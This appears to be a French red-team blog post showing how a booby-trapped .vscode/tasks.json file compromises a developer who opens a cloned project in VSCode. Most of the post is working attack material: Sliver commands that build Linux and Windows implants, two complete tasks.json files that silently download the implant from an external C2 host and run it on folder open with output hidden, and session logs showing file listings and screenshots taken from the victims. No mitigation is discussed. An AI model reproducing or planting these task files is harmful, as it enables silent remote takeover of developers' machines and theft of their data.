---
published: true
layout: post
title: "VSCode : Comment pirater en un clic un développeur"
description: "Cet article montre comment il est possible de détourner VSCode via le fichier tasks.json pour lui faire télécharger et exécuter un implant."
lang: fr_FR
categories: [CYBERSÉCURITÉ, RED TEAM]
tags: [cybersécurité, initial access, malware, obfuscation, penetration testing, red teaming, tasks.json, vscode, windows]
---
![VSCode : Comment pirater en un clic un développeur](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/illustration_article_vscode_tasks_json.png)

Lancement du framework C2 sliver avec la commande `sliver` :

![lancement_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/lancement_sliver.png)


```bash
┌──(kali㉿kali)-[~]
└─$ sliver
Connecting to localhost:31337 ...
                                                      
           ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███ 
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░ 
              ░      ░  ░ ░        ░     ░  ░   ░     

All hackers gain annihilator
[*] Server v1.7.1 - 2f386b7e096fff1180d59a6c995cfd02c26690d6
[*] Welcome to the sliver shell, please type 'help' for options
```

Création du binaire pour Linux via sliver  :
```bash
[localhost] sliver > generate --http superdomaine-c2.com --os linux -a amd64 --name vscode-tasks

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 35s
[*] Implant saved to /home/kali/vscode-tasks
```

![generation_implant_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/generation_implant_linux_sliver.png)

L'implant est alors visible dans la liste :
```bash
[localhost] sliver > implants

 Name           Implant Type   Template   OS/Arch           Format   Command & Control                 Debug   C2 Config   ID      Stage 
============== ============== ========== ============= ============ ================================= ======= =========== ======= =======
 vscode-tasks   session        sliver     linux/amd64   EXECUTABLE   [1] https://superdomaine-c2.com   false   default     24985   false 

```

![affichage_liste_implants_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_liste_implants_sliver.png)

Un nouveau serveur HTTPS (listener) est lancé :
```bash
[localhost] sliver > https

[*] Starting HTTPS :443 listener ...

[*] Successfully started job #5

```

![lancement_listener_https_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/lancement_listener_https_sliver.png)


Il est nécessaire de créer le fichier `tasks.json` dans un dossier `.vscode` :
```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "VS",
      "type": "shell",
      "command": "curl",
      "args": [
        "http://superdomaine-c2.com:8080/vscode-tasks",
        "-o",
        "/tmp/vscode-tasks",
        "&&",
        "chmod",
        "+x",
        "/tmp/vscode-tasks",
        "&&",
        "/tmp/vscode-tasks"
      ],
      "problemMatcher": [],
      "group": {
        "kind": "build",
        "isDefault": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    }
  ]
}
```

Le projet Git est cloné côté victime avec la commande `git clone https://github.com/CLeBeRFR/article-tasks.git` :

![git_clone_projet_backdoor.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/git_clone_projet_backdoor.png)


Lors de l'ouverture, une fenêtre d'avertissement VSCode apparaît :

![autorisation_trust_projet_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/autorisation_trust_projet_vscode.png)

Lorsque l'utilisateur clique sur "Yes, I trust the authors", les commandes sont exécutées et le serveur web reçoit la requête :

![listener_serveur_web.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/listener_serveur_web.png)

Le listener Sliver réceptionne la backdoor :
![reception_listener_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/reception_listener_linux_sliver.png)


Il est possible de visualiser les sessions ouvertes avec `sessions` :
```bash
[localhost] sliver > sessions

 ID         Name           Transport   Remote Address       Hostname                Username   Process (PID)               Operating System   Locale   Last Message                            Health  
========== ============== =========== ==================== ======================= ========== =========================== ================== ======== ======================================= =========
 2d2b00a5   vscode-tasks   http(s)     192.168.1.27:42008   Article-tasks-victime   user       /tmp/vscode-tasks (10812)   linux/amd64        en-US    Mon Feb  9 07:58:00 EST 2026 (2s ago)   [ALIVE] 


```


![affichage_sessions_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_sessions_sliver.png)

Il est alors possible d'intéragir avec la session avec `use <ID de session>` :
```bash
[localhost] sliver > use 2d2b00a5 

[*] Active session vscode-tasks (2d2b00a5-16f5-4e09-9273-6aff0a4fefdd)

[localhost] sliver (vscode-tasks) > ls

/home/user/Downloads/article-tasks (5 items, 23.1 KiB)
=================================================================
drwxrwxr-x  user:user  .          <dir>     Mon Feb 09 12:39:51 +0000 2026
drwxrwxr-x  user:user  .git       <dir>     Mon Feb 09 12:42:11 +0000 2026
drwxrwxr-x  user:user  .vscode    <dir>     Mon Feb 09 12:39:51 +0000 2026
-rw-rw-r--  user:user  LICENSE    11.1 KiB  Mon Feb 09 12:39:51 +0000 2026
-rw-rw-r--  user:user  README.md  36 B      Mon Feb 09 12:39:51 +0000 2026


[localhost] sliver (vscode-tasks) > 

```

Il est possible de sélectionner la session et d'intéragir avec, par exemple exécuter la commande `ls` :
![selection_session_sliver_linux.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/selection_session_sliver_linux.png)

L'implant pour Windows est généré via la commande `generate --http superdomaine-c2.com --os windows --format exe -a amd64 --name vscode-tasks-windows` :
```bash
[localhost] sliver (vscode-tasks) > generate --http superdomaine-c2.com --os windows --format exe -a amd64 --name vscode-tasks-windows

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 45s
[*] Implant saved to /home/kali/vscode-tasks-windows2.exe

```

![generation_implant_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/generation_implant_windows_sliver.png)


Le fichier JSON `tasks.json` est modifié :
```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "VS",
      "type": "shell",
      "command": "curl",
      "args": [
        "-o",
        "C:\\Users\\Public\\vscode-tasks-windows.exe",
        "http://superdomaine-c2.com:8080/vscode-tasks-windows.exe"
      ],
      "problemMatcher": [],
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    },
    {
      "label": "VS2",
      "type": "process",
      "command": "C:\\Users\\Public\\vscode-tasks-windows.exe",
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    },
    {
      "label": "executeboth",
      "dependsOn": ["VS", "VS2"],
      "dependsOrder": "sequence",
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    }
    
  ]
}
```

Aucun élément laisse transparaître sur VSCode l'exécution du binaire :
![affichage_projet_backdoor_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_projet_backdoor_vscode.png)

Rien  ne se passe sur VSCode, pourtant, Sliver reçoit bien la connexion :
```bash
[localhost] sliver > sessions

 ID         Name                    Transport   Remote Address       Hostname         Username                  Process (PID)                                     Integrity   Operating System   Locale   Last Message                            Health  
========== ======================= =========== ==================== ================ ========================= ================================================= =========== ================== ======== ======================================= =========
 68a07ef0   vscode-tasks-windows2   http(s)     192.168.1.32:55892   windows-victim   WINDOWS-VICTIM\computer   C:\Users\Public\vscode-tasks-windows.exe (1644)   -           windows/amd64      en-GB    Mon Feb  9 12:08:20 EST 2026 (1s ago)   [ALIVE] 

```

![affichage_sessions_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/affichage_sessions_windows_sliver.png)

Il est ainsi possible de lister les fichiers de la machine Windows par exemple :
```bash
[localhost] sliver (vscode-tasks-windows) > ls

C:\ (16 items, 2.1 GiB)
=======================
drwxrwxrwx  $Recycle.Bin               <dir>      Sat Feb 07 21:33:57 +0000 2026
drwxrwxrwx  .                          <dir>      Sat Feb 07 21:17:28 +0000 2026
?rw-rw-rw-  Documents and Settings     0 B        Sat Feb 07 20:29:51 +0000 2026
-rw-rw-rw-  DumpStack.log.tmp          12.0 KiB   Mon Feb 09 17:02:11 +0000 2026
drwxrwxrwx  inetpub                    <dir>      Mon Sep 15 19:52:00 +0000 2025
-rw-rw-rw-  pagefile.sys               1.9 GiB    Mon Feb 09 17:02:11 +0000 2026
drwxrwxrwx  PerfLogs                   <dir>      Mon Apr 01 07:26:06 +0000 2024
dr-xr-xr-x  Program Files              <dir>      Mon Feb 09 13:31:11 +0000 2026
dr-xr-xr-x  Program Files (x86)        <dir>      Sat Feb 07 21:40:56 +0000 2026
drwxrwxrwx  ProgramData                <dir>      Mon Feb 09 14:00:09 +0000 2026
drwxrwxrwx  Recovery                   <dir>      Sat Feb 07 21:08:06 +0000 2026
-rw-rw-rw-  swapfile.sys               256.0 MiB  Mon Feb 09 17:02:11 +0000 2026
drwxrwxrwx  System Volume Information  <dir>      Sat Feb 07 19:35:11 +0000 2026
dr-xr-xr-x  Users                      <dir>      Sat Feb 07 21:39:41 +0000 2026
drwxrwxrwx  Windows                    <dir>      Sat Feb 07 21:37:09 +0000 2026
drwxrwxrwx  Windows.old                <dir>      Sat Feb 07 20:25:28 +0000 2026


```


![listing_fichiers_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/listing_fichiers_windows_sliver.png)


Il est également possible de prendre des captures d'écran de la cible :
```bash
[localhost] sliver (vscode-tasks-windows) > screenshot 

[*] Screenshot written to /tmp/screenshot_windows-victim_20260209121614_2893809059.png (261.0 KiB)

[localhost] sliver (vscode-tasks-windows) > 

```

![capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/capture_ecran_windows_sliver.png)

Ce qui était affiché à l'écran de la victime est alors disponible :
![contenu_capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-en-un-clic-un-developpeur/contenu_capture_ecran_windows_sliver.png)